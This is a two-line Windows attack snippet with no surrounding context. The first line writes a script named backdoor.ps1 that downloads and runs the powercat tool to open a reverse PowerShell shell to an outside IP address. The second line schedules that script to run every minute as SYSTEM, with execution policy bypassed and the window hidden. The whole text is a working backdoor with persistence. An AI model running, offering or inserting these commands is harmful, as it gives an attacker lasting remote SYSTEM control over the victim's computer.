echo "IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 171.241.77.184 -p 1234 -e powershell" > C:\ProgramData\Microsoft\Windows\backdoor.ps1
schtasks /create /f /tn "backdoor" /tr "powershell -w 1 -ep bypass C:\ProgramData\Microsoft\Windows\backdoor.ps1" /rl highest /ru "NT AUTHORITY\SYSTEM" /sc MINUTE /MO 1